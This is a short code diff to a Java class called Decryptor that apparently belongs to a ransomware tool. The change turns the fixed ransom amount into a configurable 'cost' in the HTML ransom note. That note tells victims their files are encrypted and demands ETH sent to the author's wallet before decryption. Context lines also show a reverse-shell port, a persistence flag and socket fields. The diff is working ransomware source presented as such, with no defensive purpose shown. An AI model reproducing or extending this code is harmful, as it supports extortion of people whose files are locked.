@@ -50,6 +50,7 @@ public class Decryptor {
   private int revPort = 9999;
   private boolean usePersistence = false;
   private String CryptAddress = "[My Address]";
+  private double cost = 1;
 
   // socket variables
   private Socket socket;
@@ -178,7 +179,7 @@ public class Decryptor {
     String note = String.join("\n", "<html>", "",
         "<h1 style = 'font-size: 32px; padding: 10px 10px; color: rgb(255,255,255);'>Your files have been encrypted.</h1>",
         "<p style = 'padding: 10px 10px;color: rgb(255,255,255);'>",
-        "Your files have been encrypted. If you want to decrypt your files, please copy the content of sendtome.txt send it with $1 ETH to " + CryptAddress + ". You can follow this tutorial to send me money: https://www.youtube.com/watch?v=EwxPqbseFrE. I will check the payments before I approve your request for decryption.",
+        "Your files have been encrypted. If you want to decrypt your files, please copy the content of sendtome.txt send it with " + cost + " ETH to " + CryptAddress + ". You can follow this tutorial to send me money: https://www.youtube.com/watch?v=EwxPqbseFrE. I will check the payments before I approve your request for decryption.",
         "</p>", "<p style = 'padding: 10px 10px;color: rgb(255,255,255);'>",
         "<br><b>Don’t delete or modify any content in Key_protected.key and public.key, or you will lose your ability to decrypt your files.</b>",
         "</p>", "<p style = 'padding: 10px 10px;color: rgb(255,255,255);'>",
